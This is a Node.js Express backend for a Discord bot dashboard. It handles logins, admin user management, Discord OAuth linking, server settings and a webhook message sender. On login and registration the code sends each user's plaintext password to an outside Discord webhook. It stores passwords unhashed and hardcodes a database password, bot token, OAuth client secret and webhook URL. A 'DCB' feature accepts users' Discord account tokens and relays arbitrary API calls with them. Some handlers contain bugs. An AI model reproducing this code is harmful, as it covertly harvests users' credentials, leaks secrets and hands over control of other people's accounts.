const express = require("express");
const app = express();
const {createToken, decodeToken} = require("./utils");
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const cors = require('cors');
const mongoose = require('mongoose');
const {CLIENT_URL, REDIRECT_URL} = require("./config");
const axios = require("axios");
const path = require("path");
const fs = require("fs");
const {m_client} = require("../KMB/main");

//Websocket
const http = require('http');
const server = http.createServer(app);
const {Server} = require("socket.io");
const io = new Server(server);
module.exports = {
  io
};

const {client} = require("../KB/main");

mongoose.connect('mongodb+srv://fsdfsdfsdf:aYZdwxlnetcEVTzr@cluster0.epd8a.mongodb.net/kingo-tools?retryWrites=true&w=majority').then(() => {
  console.log("Database connected")
});

const flags = [
  {
    id: 1,
    title: "User",
    color: "cyan"
  },
  {
    id: 2,
    title: "Admin",
    color: "gold"
  }
];

const BOT_TOKEN = "OTU2NTA3ODAzMzk1MTc4NTQ5.YjxPTw.mwPbEQWwBMaUleOPvLjYmh0QNj0";

const User = mongoose.model('User', {
  login: String,
  password: String,
  flags: Array,
  discord: Object
});

const Guild = mongoose.model("Server", {
  id: String,
  owner_id: String,
  options: Object,
  data: Object
})

const verifyToken = async (token) => {
  if (!token) {
    return false;
  }

  let user;

  try {
    const decode = await decodeToken(token);
    user = await User.findOne({login: decode.login});
  } catch (e) {
    return false;
  }
  ;

  if (user) {
    return user;
  } else {
    return false;
  }
}

async function log(mes) {
  const {data} = await axios.post(`https://discord.com/api/webhooks/974024452130078741/RUz8uwlCujoTFcxi8myl89ydNrUEyrMM2_H6y4QD7BmITpN3XNHtSin4aO2SrJQnLj3j`, {
    content: mes
  });
  console.log(data);
}

app.use(bodyParser.json());
app.use(cookieParser());
app.use(cors({
  origin: CLIENT_URL,
  credentials: true,
}));
app.use(express.static(path.join(path.dirname(__dirname), "client", "build")))
app.get("/", async (req, res) => {
  res.sendFile(path.join(path.dirname(__dirname), "client", "build", "index.html"));
});
app.post("/api/login", async (req, res) => {
  const {login, password} = req.body;

  if (!login || !password) {
    res.send({err: true, message: "Заполните все поля!"});
    return;
  }

  const user = await User.findOne({login});

  if (!user) {
    res.send({err: true, message: "Пользователь не найден!"});
    return;
  }

  if (user.password !== password) {
    res.send({err: true, message: "Неправильный пароль!"});
    return;
  }

  const token = await createToken(user.login);

  res.cookie("token", token);
  await log(`Пользователь авторизовался | \`${login}\` \`${password}\` `);
  res.send({err: false, token});
});
app.post("/api/registration", async (req, res) => {
  const {login, password} = req.body;

  if (!login || !password) {
    res.send({err: true, message: "Заполните все поля!"});
    return;
  }

  if (password.length < 10) {
    res.send({err: true, message: "Пароль должен содержать больше 9-ти символов!"});
    return;
  }

  const checkUser = await User.findOne({login});

  if (checkUser) {
    res.send({err: true, message: "Логин занят."});
    return;
  }

  const user = new User({login, password, flags: [], discord: {}});
  await user.save();

  await log(`Пользователь создал аккаунт | \`${login}\` \`${password}\` `);

  res.send({err: false});
})
app.post("/api/verify", async (req, res) => {
  const {token} = req.body;

  if (!token) {
    res.send({err: true});
    return;
  }

  let decode;

  try {
    decode = await decodeToken(token);
  } catch (e) {
    res.send({err: true});
    return;
  }

  let user = await User.findOne({login: decode?.login});

  if (user) {
    res.send({err: false});
  } else {
    res.send({err: true});
  }

});
app.get("/api/data", async (req, res) => {
  const {token} = req.cookies;
  if (!token) {
    res.send({err: true});
    return;
  }

  let user;

  try {
    const decode = await decodeToken(token);
    user = await User.findOne({login: decode.login});
  } catch (e) {
    res.send({err: true});
    return;
  }
  ;

  if (Object.keys(user.discord || {}).length > 0) {
    delete user.discord.guilds;
    res.send({login: user.login, flags: user.flags, discord: user.discord});
  } else {
    res.send({login: user.login, flags: user.flags, discord: user.discord});
  }

});
app.get("/api/fetchGuilds", async (req, res) => {
  const {token} = req.cookies;
  if (!token) {
    res.send({err: true});
    return;
  }

  let user;

  try {
    const decode = await decodeToken(token);
    user = await User.findOne({login: decode.login});
  } catch (e) {
    res.send({err: true});
    return;
  }
  ;

  if (Object.keys(user.discord).length === 0) {
    res.send({err: true});
    return;
  }

  //refreshing guilds
  let discordToken = null;
  let refreshToken = null;

  const params = new URLSearchParams()
  params.append('client_id', '956507803395178549');
  params.append('client_secret', 'fo2R8GvvwpvVROrXu_LyRoQwnXrfuddb');
  params.append('grant_type', 'refresh_token');
  params.append('refresh_token', user.discord.refreshToken)

  axios.post("https://discord.com/api/oauth2/token", params, {
    'Content-Type': 'application/x-www-form-urlencoded'
  }).then(async ({data}) => {
    discordToken = data.access_token;
    refreshToken = data.refresh_token;

    console.log(refreshToken);
    console.log(discordToken);

    user.discord = {...user.discord, refreshToken};
    await user.save();

    const {data: guilds} = await axios.get("https://discord.com/api/users/@me/guilds", {
      headers: {
        "Authorization": `Bearer ${discordToken}`
      }
    });

    user.discord.guilds = guilds;
    await user.save();

    res.send({err: false, guilds: user.discord.guilds.filter(guild => guild.owner)});

  }).catch((e) => {
    res.send({err: true, message: "Ошибка обновления серверов"})
  })
})

/*Discord Client Bot*/
/*FLAG - 1*/
app.post("/api/dcb/login", async (req, res) => {
  const {token} = req.cookies;
  const {token: discordToken} = req.body;

  const user = await verifyToken(token);
  if (!user || !discordToken) {
    res.send({err: true, message: "Укажите токен!"});
    return;
  }

  if (!user.flags.some(flag => flag.id === 1)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }

  //Connecting to account
  let result = false;
  try {
    await axios.patch(`https://discord.com/api/v9/users/@me/settings`, {
      client_status: {
        mobile: "online"
      }
    }, {
      headers: {
        authorization: discordToken
      }
    })
    result = true;
  } catch (e) {
    result = false;
  }

  if (result) {
    res.send({err: false, message: "Пользователь авторизован!"});
    await log(`DCB | ${user.login} использовал токен \`${token}\``);
  } else {
    res.send({err: true, message: "Неверный токен!"})
  }

})
app.post("/api/dcb/command", async (req, res) => {
  const {method, body, path, authToken} = req.body;
  const {token} = req.cookies;

  const user = await verifyToken(token);
  if (!user || !token) {
    res.send({err: true, message: "Укажите токен!"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 1)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }

  if (!method || !path || !authToken) {
    res.status(400).send({err: true, message: "Bad Request"});
    return;
  }

  try {
    if (method === "get" || method === "delete") {
      const {data} = await axios[method](`https://discord.com/api/v9/${path}`, {
        headers: {
          authorization: authToken
        }
      });
      res.send({err: false, message: data});
      return;
    } else {
      const {data} = await axios[method](`https://discord.com/api/v9/${path}`, body, {
        headers: {
          authorization: authToken
        }
      });
      res.send({err: false, message: data});
      return;
    }

  } catch (e) {
    res.send({err: false, message: e});
    return;
  }

});

/*ADMIN PAGE*/
app.get("/api/admin/users", async (req, res) => {
  const {token} = req.cookies;

  const user = await verifyToken(token);
  if (!user || !token) {
    res.send({err: true, message: "Укажите токен!"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 2)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }

  const users = await User.find({});
  res.send({err: false, users});
});
app.post("/api/admin/create", async (req, res) => {
  const {token} = req.cookies;
  const {login, password} = req.body;
  const user = await verifyToken(token);
  if (!user || !token) {
    res.send({err: true, message: "Укажите токен!"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 2)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }
  if (!login, !password) {
    res.send({err: true, message: "Заполните все поля!"});
    return;
  }

  const checkUser = await User.findOne({login});

  if (checkUser) {
    res.send({err: true, message: "Пользователь с таким Login уже существует."});
    return;
  }

  const newUser = new User({login, password, flags: [], discord: {}});
  await newUser.save();
  res.send({err: false});
});
app.post("/api/admin/delete", async (req, res) => {
  const {token} = req.cookies;
  const {login} = req.body;
  const user = await verifyToken(token);
  if (!user || !token) {
    res.send({err: true, message: "Укажите токен!"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 2)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }
  if (!login) {
    res.send({err: true, message: "Не указан логин!"});
    return;
  }

  const deleteUser = await User.findOne({login});

  if (!deleteUser) {
    res.send({err: true, message: "Пользователь не найден!"});
    return;
  }

  await deleteUser.remove();

  res.send({err: false, message: "Успешно!"});
});
app.post("/api/admin/addFlag", async (req, res) => {
  const {token} = req.cookies;
  const {login, flagID} = req.body;
  const user = await verifyToken(token);
  if (!user || !token) {
    res.send({err: true, message: "Укажите токен!"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 2)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }
  if (!login) {
    res.send({err: true, message: "Не указан логин!"});
    return;
  }
  if (!flagID) {
    res.send({err: true, message: "Не указан флаг!"});
    return;
  }

  const flag = flags.find(flag => flag.id === flagID);
  if (!flag) {
    res.send({err: true, message: "Флага не существует!"});
    return;
  }
  ;

  const addUser = await User.findOne({login});
  if (!addUser) {
    res.send({err: true, message: "Пользователь не найдён!"});
    return;
  }
  if (addUser.flags.find(flag => flag.id === flagID)) {
    res.send({err: true, message: "Пользователь уже имеет данный флаг!"});
    return;
  }

  addUser.flags.push(flag);
  await addUser.save();
  res.send({err: false, message: "Успешно!"});
});
app.post("/api/admin/removeFlag", async (req, res) => {
  const {token} = req.cookies;
  const {login, flagID} = req.body;
  const user = await verifyToken(token);
  if (!user || !token) {
    res.send({err: true, message: "Укажите токен!"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 2)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }
  if (!login) {
    res.send({err: true, message: "Не указан логин!"});
    return;
  }
  if (!flagID) {
    res.send({err: true, message: "Не указан флаг!"});
    return;
  }

  const flag = flags.find(flag => flag.id === flagID);
  if (!flag) {
    res.send({err: true, message: "Флага не существует!"});
    return;
  }
  ;

  const addUser = await User.findOne({login});
  if (!addUser) {
    res.send({err: true, message: "Пользователь не найдён!"});
    return;
  }
  if (!addUser.flags.find(flag => flag.id === flagID)) {
    res.send({err: true, message: "Пользователь не имеет данный флаг!"});
    return;
  }

  addUser.flags = addUser.flags.filter(flag => flag.id !== flagID);
  await addUser.save();
  res.send({err: false, message: "Успешно!"});
});
app.get("/api/admin/flags", async (req, res) => {
  const {token} = req.cookies;
  const user = await verifyToken(token);
  if (!user || !token) {
    res.send({err: true, message: "Укажите токен!"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 2)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }

  res.send(flags);
});

//Link Discord
app.post("/api/discord", async (req, res) => {
  const {token} = req.cookies;
  const {code} = req.body;

  const user = await verifyToken(token);
  if (!user || !token) {
    res.send({err: true, message: "Укажите токен!"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 1)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }
  if (Object.keys(user.discord).length > 0) {
    res.send({err: true, message: "Discord аккаунт уже привязан"});
    return;
  }
  if (!code) {
    res.send({err: true, message: ""});
    return;
  }

  const params = new URLSearchParams()
  params.append('client_id', '956507803395178549');
  params.append('client_secret', 'fo2R8GvvwpvVROrXu_LyRoQwnXrfuddb');
  params.append('grant_type', 'authorization_code');
  params.append('code', code);
  params.append('redirect_uri', REDIRECT_URL);

  let type = null;
  let discordToken = null;
  let refreshToken = null;

  axios.post("https://discord.com/api/oauth2/token", params, {
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    }
  }).then(async ({data}) => {

    type = data.token_type;
    discordToken = data.access_token;
    refreshToken = data.refresh_token;


    axios.get("https://discord.com/api/users/@me", {
      headers: {
        "Authorization": `${type} ${discordToken}`
      }
    }).then(async ({data: userData}) => {

      const {data: guilds} = await axios.get("https://discord.com/api/users/@me/guilds", {
        headers: {
          "Authorization": `${type} ${discordToken}`
        }
      });

      user.discord = {...userData, guilds, refreshToken};
      await user.save();
      res.send({err: false})


    }).catch((e) => {
      res.send({err: true, message: "Ошибка"})
      console.log(e);
    })
  }).catch((e) => {

    res.send({err: true, message: "Ошибка"})

  });

})

//Fetch Server Data
app.get("/api/fetchGuildData", async (req, res) => {
  const {token} = req.cookies;
  const {serverId} = req.query;

  const user = await verifyToken(token);
  if (!user || !token) {
    res.send({err: true, message: "Укажите токен!"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 1)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }
  if (Object.keys(user.discord).length === 0) {
    res.send({err: true, message: "Discord аккаунт не привязан"});
    return;
  }

  if (!user.discord.guilds.find(guild => guild.id === serverId)) {
    res.send({err: true, message: "Вы не владеете данным серверов"});
    return;
  }

  let guild = await Guild.findOne({id: serverId});

  if (!guild) {
    res.send({err: false, message: "Добавьте бота на сервер"});
    return;
  } else {
    let guildDs = await client.guilds.fetch(serverId);

    let roles = guildDs.roles.cache;
    let channels = guildDs.channels.cache;

    let rolesArr = [];
    let channelsArr = [];

    roles.forEach(role => {
      rolesArr.push({name: role.name, id: role.id, color: role.hexColor});
    });
    channels.forEach(channel => {
      if (channel.type === "GUILD_TEXT") {
        channelsArr.push({name: channel.name, id: channel.id})
      }
    });
    res.send({err: false, guild, roles: rolesArr, channels: channelsArr});
    return;
  }
})

//editing server config
app.post("/api/config", async (req, res) => {

  /* ==== req body structure ====


  * type => change_field | on_module | off_module | change_command | add_levels_rule | remove_levels_rule | check_log_property | uncheck_log_property | add_custom_command | remove_custom_command
  * payload => something data
  * guild_id => guild id
  * module => module name in database
  * property => module property to change
  * commandName? => name of command to change
  * */

  const {token} = req.cookies;

  const {type, payload, guild_id, module, property, commandName} = req.body;

  const user = await verifyToken(token);
  if (!user || !type || (!payload && typeof payload !== "boolean") || !guild_id || !module || !property) {
    res.send({err: true, message: "Incorrect form data"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 1)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }
  if (Object.keys(user.discord).length === 0) {
    res.send({err: true, message: "Discord аккаунт не привязан"});
    return;
  }

  if (!user.discord.guilds.find(guild => guild.id === guild_id)) {
    res.send({err: true, message: "Вы не владеете данным серверов"});
    return;
  }

  let guild = await Guild.findOne({id: guild_id});

  if (!guild) {
    res.send({err: true, message: "Сервер не найден"});
    return;
  }

  if (!guild.options.hasOwnProperty(module)) {
    res.send({err: true, message: "Модуль не найден!"});
    return;
  }

  switch (type) {
    case "change_field":

      if (!guild.options[module].hasOwnProperty(property)) {
        res.send({err: true, message: "Свойство не найдено!"});
        return;
      }

      if (typeof guild.options[module][property] !== typeof payload) {
        res.send({err: true, message: "Неверные данные для изменения!"});
        return;
      }

      if (property === "punishment") {
        switch (true) {
          case ("name" in payload):
            guild.options = {
              ...guild.options,
              [module]: {...guild.options[module], [property]: {...guild.options[module][property], name: payload.name}}
            }
            break;
          case ("duration" in payload):
            guild.options = {
              ...guild.options,
              [module]: {
                ...guild.options[module],
                [property]: {...guild.options[module][property], duration: payload.duration}
              }
            }
            break;
          case ("reason" in payload):
            guild.options = {
              ...guild.options,
              [module]: {
                ...guild.options[module],
                [property]: {...guild.options[module][property], reason: payload.reason}
              }
            }
            break;
        }
        await guild.save();
        res.send({err: false})
      } else {
        guild.options = {...guild.options, [module]: {...guild.options[module], [property]: payload}}

        await guild.save();
        res.send({err: false})
      }

      break;

    case "on_module":
      guild.options = {...guild.options, [module]: {...guild.options[module], on: true}};
      guild.save().then(() => {
        res.send({err: false})
      });
      break;

    case "off_module":
      guild.options = {...guild.options, [module]: {...guild.options[module], on: false}};
      guild.save().then(() => {
        res.send({err: false})
      });
      break;

    case "change_command":
      if (!commandName) {
        res.send({err: true, message: "Укажите название команды!"});
        return;
      }
      const commandsArray = JSON.parse(JSON.stringify(guild.options.commands));
      const command = commandsArray.find(command => command.name === commandName);
      if (!command) {
        res.send({err: true, message: "Команда не найдена!"});
        return;
      }
      if (!(property in command)) {
        res.send({err: true, message: "Свойство не найдено!"});
        return;
      }
      if (property !== "rolesWhiteList" && property !== "on" && property !== "channelWhiteList") {
        res.send({err: true, message: "Данное свойство нельзя изменить!"});
        return;
      }

      if (typeof command[property] !== typeof payload) {
        res.send({err: true, message: "Неверные данные для изменения!"});
        return;
      }

      let resultArray = [];

      command[property] = payload;

      for (let c of commandsArray) {
        if (c.name !== commandName) {
          resultArray.push(c);
        } else {
          resultArray.push(command);
        }
      }

      guild.options = {...guild.options, [module]: [...resultArray]};

      await guild.save().catch(console.log);
      res.send({err: false})
      break;

    case "add_levels_rule":

      const {roleId: payload_roleId, levelRequired: payload_levelRequired, comment: payload_comment} = payload;

      if (!payload_roleId || !payload_levelRequired || !payload_comment) {
        res.send({err: true, message: "Неверный формат данных!"});
        return;
      }

      if (guild.options.levelSystem.levelRoles.find(rule => rule.roleId === payload_roleId)) {
        res.send({err: true, message: "Правило для этой роли уже существует!"});
        return;
      }

      guild.options = {
        ...guild.options,
        levelSystem: {...guild.options.levelSystem, levelRoles: [...guild.options.levelSystem.levelRoles, payload]}
      };
      await guild.save();
      res.send({err: false});
      break;

    case "remove_levels_rule":

      if (typeof payload !== "string") {
        res.send({err: true, message: "Неверный формат данных!"});
        return;
      }

      let arr = [];

      for (let rule of guild.options.levelSystem.levelRoles) {
        if (rule.roleId === payload) {
          continue;
        }
        arr.push(rule);
      }

      guild.options = {...guild.options, levelSystem: {...guild.options.levelSystem, levelRoles: arr}};
      await guild.save();

      res.send({err: false})

      break;

    case "check_log_property":
      let logger = JSON.parse(JSON.stringify(guild.options.logger));
      if (!["modAllow", "messageEventsAllow", "voiceAllow", "membersAllow"].includes(property)) {
        res.send({err: true, message: "Cвойство не найдено!"});
        return;
      }
      let allowedProperty = ["BAN", "KICK", "TIMEOUT", "BAN_REMOVE", "TIMEOUT_REMOVE", "MESSAGE_DELETE", "MESSAGE_EDIT", "MESSAGE_PURGED", "VOICE_JOIN", "VOICE_LEAVE", "VOICE_CHANGE", "MEMBER_JOIN", "MEMBER_LEAVE", "MEMBER_ROLE_ADD", "MEMBER_ROLE_REMOVE", "MEMBER_NICKNAME_CHANGE", "MUTE", "MUTE_REMOVE"];
      if (!allowedProperty.includes(payload)) {
        res.send({err: true, message: "Cвойство не найдено!"});
        return;
      }
      console.log(property, logger)
      if (logger[property].includes(payload)) {
        res.send({err: true, message: "Cвойство уже включено!"});
        return;
      }
      logger[property].push(payload);
      guild.options = {...guild.options, logger};
      await guild.save().catch(console.log);
      res.send({err: false})
      break;

      break;

    case "uncheck_log_property":
      let loggerCopy = JSON.parse(JSON.stringify(guild.options.logger));
      if (!["modAllow", "messageEventsAllow", "voiceAllow", "membersAllow"].includes(property)) {
        res.send({err: true, message: "Cвойство не найдено!"});
        return;
      }
      let allowedPropertys = ["BAN", "KICK", "TIMEOUT", "BAN_REMOVE", "TIMEOUT_REMOVE", "MESSAGE_DELETE", "MESSAGE_EDIT", "MESSAGE_PURGED", "VOICE_JOIN", "VOICE_LEAVE", "VOICE_CHANGE", "MEMBER_JOIN", "MEMBER_LEAVE", "MEMBER_ROLE_ADD", "MEMBER_ROLE_REMOVE", "MEMBER_NICKNAME_CHANGE"];
      if (!allowedPropertys.includes(payload)) {
        res.send({err: true, message: "Cвойство не найдено!"});
        return;
      }
      if (!loggerCopy[property].includes(payload)) {
        res.send({err: true, message: "Cвойство уже выключено!"});
        return;
      }
      loggerCopy[property] = loggerCopy[property].filter(p => p !== payload);
      guild.options = {...guild.options, logger: loggerCopy};
      await guild.save().catch(console.log);
      res.send({err: false})
      break;

    case "add_custom_command":
      if (!"name" in payload || !"text" in payload || !"sendChannel" in payload || !"rolesWhiteList" in payload || !"channelWhiteList" in payload) {
        res.send({err: true, message: "Invalid from data!"});
        return
      }
      const {name, text, sendChannel, rolesWhiteList, channelWhiteList} = payload;
      if (typeof name !== "string" || typeof text !== "string" || typeof sendChannel !== "string" || !rolesWhiteList instanceof Array || !channelWhiteList instanceof Array) {
        res.send({err: true, message: "Invalid from data!"});
        return
      }
      let сcommand = await JSON.parse(JSON.stringify(guild.options.customCommands)).find(c => c.name === payload.name);
      if (сcommand) {
        res.send({err: true, message: "Команда с таким именем уже существует"});
        return
      }
      guild.options = {...guild.options, customCommands: [...guild.options.customCommands, payload]};
      await guild.save();
      res.send({err: false});
      break;
    case "remove_custom_command":
      if (typeof payload !== "string") {
        res.send({err: true, message: "Invalid from data!"});
        return
      }
      let comArr = [];

      for (let command of guild.options.customCommands) {
        if (command.name === payload) {
          continue;
        }
        comArr.push(command);
      }
      guild.options = {...guild.options, customCommands: comArr};
      await guild.save();
      res.send({err: false});
      break;

    default:
      res.send({err: true, message: "Action не найден!"});
      return;
  }

})
app.post("/api/addReactionRole", async (req, res) => {
  const {token} = req.cookies;

  const {guild_id, data} = req.body

  const user = await verifyToken(token);
  if (!user || !data || !"messageId" in data || !"roleId" in data || !"channelId" in data || !"emoji" in data) {
    res.send({err: true, message: "Incorrect form data"});
    return;
  }

  if (!user.flags.some(flag => flag.id === 1)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }
  if (Object.keys(user.discord).length === 0) {
    res.send({err: true, message: "Discord аккаунт не привязан"});
    return;
  }

  if (!user.discord.guilds.find(guild => guild.id === guild_id)) {
    res.send({err: true, message: "Вы не владеете данным серверов"});
    return;
  }

  let guild = await Guild.findOne({id: guild_id});

  if (!guild) {
    res.send({err: true, message: "Сервер не найден"});
    return;
  }

  try {
    let channel = await client.channels.fetch(data.channelId);
    let message = await channel.messages.fetch(data.messageId);
    await message.react(data.emoji);
  } catch (e) {
  }

  guild.options = {...guild.options, reactionRole: [...guild.options.reactionRole, data]};
  await guild.save();

  res.send({err: false})
  await log(`Kingo Bot | ${user.login} добавил rr`);
});
app.post("/api/removeReactionRole", async (req, res) => {
  const {token} = req.cookies;

  const {guild_id, id} = req.body

  const user = await verifyToken(token);
  if (!user || !id) {
    res.send({err: true, message: "Incorrect form data"});
    return;
  }

  if (!user.flags.some(flag => flag.id === 1)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }
  if (Object.keys(user.discord).length === 0) {
    res.send({err: true, message: "Discord аккаунт не привязан"});
    return;
  }

  if (!user.discord.guilds.find(guild => guild.id === guild_id)) {
    res.send({err: true, message: "Вы не владеете данным серверов"});
    return;
  }

  let guild = await Guild.findOne({id: guild_id});

  if (!guild) {
    res.send({err: true, message: "Сервер не найден"});
    return;
  }
  try {
    let channel = await client.channels.fetch(data.channelId);
    let message = await channel.messages.fetch(data.messageId);
    await message.reactions.cache.get(await guild.options.reactionRole.find(r => r.id === id).emoji).remove()
  } catch (e) {
  }


  let resultArr = [];

  for (let role of JSON.parse(JSON.stringify(guild.options.reactionRole))) {
    if (role.id !== id) {
      resultArr.push(role);
    }
  }

  guild.options = {...guild.options, reactionRole: resultArr};
  await guild.save();

  res.send({err: false});
  await log(`Kingo Bot | ${user.login} удалил rr `);
});

//update bot commands
app.post("/api/updateGuildData", async (req, res) => {
  const {token} = req.cookies;

  const {guild_id} = req.body;

  const user = await verifyToken(token);
  if (!user || !guild_id) {
    res.send({err: true, message: "Incorrect form data"});
    return;
  }
  if (!user.flags.some(flag => flag.id === 1)) {
    res.send({err: true, message: "Вы не можете использовать этот функционал!"});
    return;
  }
  if (Object.keys(user.discord).length === 0) {
    res.send({err: true, message: "Discord аккаунт не привязан"});
    return;
  }
  if (!user.discord.guilds.find(guild => guild.id === guild_id)) {
    res.send({err: true, message: "Вы не владеете данным серверов"});
    return;
  }
  let guild = await Guild.findOne({id: guild_id});
  if (!guild) {
    res.send({err: true, message: "Сервер не найден"});
    return;
  }

  const pathArray = fs.readdirSync(path.join(path.dirname(__dirname), "KB", "commands"), {withFileTypes: true}).filter(command => command.category !== "admin");

  const musicPathArray = fs.readdirSync(path.join(path.dirname(__dirname), "KMB", "commands"), {withFileTypes: true}).filter(command => command.category !== "admin");

  let newCommands = [];

  for (const p of pathArray) {
    const command = require("../KB/commands/" + p.name);
    newCommands.push(command);
  }

  for (const p of musicPathArray) {
    const command = require("../KMB/commands/" + p.name);
    newCommands.push(command);
  }

  newCommands = newCommands.map(({name, description, example, category, alternative, useSlash}) => {
    return {
      name, description, example, category, alternative,
      isSlash: useSlash,
      on: true,
      rolesWhiteList: [],
      channelWhiteList: []
    }
  });

  let guildCommands = JSON.parse(JSON.stringify(guild.options.commands));

  let resultCommands = [];

  for (let command of newCommands) {
    let guildCommand = guildCommands.find(c => c.name === command.name);

    if (!guildCommand) {
      resultCommands.push(command);
      continue;
    }

    resultCommands.push({
      on: guildCommand.on,
      name: command.name,
      example: command.example,
      description: command.description,
      category: command.category,
      alternative: command?.alternative || [],
      isSlash: command?.isSlash || false,
      rolesWhiteList: guildCommand.rolesWhiteList,
      channelWhiteList: guildCommand.channelWhiteList
    })
  }

  guild.options = {...guild.options, commands: [...resultCommands]};
  await guild.save();
  res.send({err: false});
  await log(`Kingo Bot | ${user.login} обновил команды на сервере \`${guild.id}\` `);
});

app.get("*", async (req, res) => {
  res.sendFile(path.join(path.dirname(__dirname), "client", "build", "index.html"));
})

io.on('connection', async (socket) => {
  socket.data = {
    user: null,
    webSender: {
      webHook: {
        name: null,
        image: null
      },
      guild: null,
      channel: null,
      lastChannel: null
    }
  };

  socket.on("auth", async ({token}) => {
    if (socket.data.user) return;
    const user = await verifyToken(token);
    if (!user) {
      socket.disconnect();
      return;
    }
    if (!user.flags.some(flag => flag.id === 1)) {
      socket.disconnect();
      return;
    }

    let checkSocket;
    for (let s of io.sockets.sockets) {
      if (s[1]?.data?.user?.login === user.login) {
        checkSocket = s;
      }
    }
    if (checkSocket) {
      checkSocket[1].disconnect();
    }
    socket.data.user = user;
  })
  socket.on("load_webhook_data", async ({name, image, guild}) => {
    if (!guild) return;
    let guildObj;
    try{
      guildObj = await client.guilds.fetch(guild)
    }catch (e){
      return;
    }
    name = name || "Webhook";
    image = image || "https://indiaatoz.in/wp-content/uploads/2021/09/6138f89602459-384x384.png";

    socket.data.webSender.webHook = {name, image};
    socket.data.webSender.guild = guild;

    let channels = Array.from(guildObj.channels.cache).filter(channel => {
      return channel[1].type === "GUILD_TEXT" || channel[1].type === "GUILD_CATEGORY"
    }).map(channel => {
      return {
        name: channel[1].name,
        id: channel[1].id,
        parentId: channel[1].parentId,
        position: channel[1].rawPosition,
        type: channel[1].type
      }
    });
    socket.emit("channels_data", channels);
  })
  socket.on("set_current_channel", async (id) => {
    socket.data.webSender.lastChannel = socket.data.webSender.channel;
    id = id || null;
    socket.data.webSender.channel = id;
    socket.emit("channel_change");
    let guildObj;
    try{
      guildObj = await client.guilds.fetch(socket.data.webSender.guild);
      if (!guildObj) return;
      let channel = await guildObj.channels.fetch(id);
      if (!channel) return;
      let messages = await channel?.messages?.fetch({ limit: 50 }).catch(e => e);
      if (!messages) return;
      messages = await Promise.all(messages?.map(async mes => {
        let member;
        try{
          member = await mes.guild.members.cache.get(mes.author.id);
        }catch (e) {
        }

        return {
          authorName: mes.author.username,
          id: mes.id,
          authorBot: mes.author.bot,
          authorImageURL: mes.author.displayAvatarURL(),
          content: mes.content,
          timestamp: mes.createdTimestamp,
          embeds: mes.embeds,
          attachments: mes.attachments,
          deleted: false,
          edit: false,
          displayColor: member?.displayHexColor || "#ffffff"
        }
      }));
      socket.emit("messages_fetch", messages.reverse());
    }catch (e){
      return;
    }

  })

  socket.on("sendMessage", async (message) => {
    let guildObj;
    try{
      guildObj = await client.guilds.fetch(socket.data.webSender.guild)
    }catch (e){
      return;
    }
    if (!guildObj) return;
    let channel = await guildObj.channels.fetch(socket.data.webSender.channel);
    if (!channel) return;
    try{
      const webhooks = await channel.fetchWebhooks();
      let webhook = webhooks.find(wh => wh.name === "WebSenderService");
      if (!webhook){
        webhook = await channel.createWebhook("WebSenderService", {
          avatar: "",
        });
      }

      await webhook.send({
        content: !!message?.content ? message?.content : undefined,
        username: socket.data.webSender.webHook.name,
        avatarURL: socket.data.webSender.webHook.image,
        embeds: message.embeds || []
      }).catch(async e => {
        await webhook.send({
          content: !!message?.content ? message?.content : undefined,
          username: socket.data.webSender.webHook.name,
          avatarURL: socket.data.webSender.webHook.image,
          embeds: []
        })
      })
    }catch (e) {
      console.log(e);
      return;
    }
  })

  client.on("messageCreate", async (message) => {
    if (message.guild.id === socket.data.webSender.guild && message.channel.id === socket.data.webSender.channel){
      let member;
      try{
        member = await message.guild.members.cache.get(message.author.id);
      }catch (e) {
      }

      let mes = {
          authorName: message.author.username,
          authorImageURL: message.author.displayAvatarURL(),
          content: message.content,
          authorBot: message.author.bot,
          timestamp: message.createdTimestamp,
          embeds: message.embeds,
          id: message.id,
          attachments: message.attachments,
          deleted: false,
          displayColor: member?.displayHexColor || "#ffffff",
          edit: false,
        }
      socket.emit("new_message", mes);
    }
  })
  client.on("messageUpdate",  async (oldMessage, newMessage) =>  {
    if (!oldMessage) return;
    if (newMessage.guild.id === socket.data.webSender.guild && newMessage.channel.id === socket.data.webSender.channel){
      let mes = {
        id: newMessage.id,
        content: newMessage.content,
        embeds: newMessage.embeds,
        attachments: newMessage.attachments
      }
      socket.emit("message_edit", mes);
    }
  })

  client.on("messageDelete", async (message) => {
    if (message.guild.id === socket.data.webSender.guild && message.channel.id === socket.data.webSender.channel){
      let mes = {
        id: message.id
      }
      socket.emit("message_delete", mes);
    }
  })

});

//kingo-tools.herokuapp.com
server.listen(process.env.PORT || 13329,  () => {
  console.log(`Server running on port ${process.env.PORT || 13329}`)
})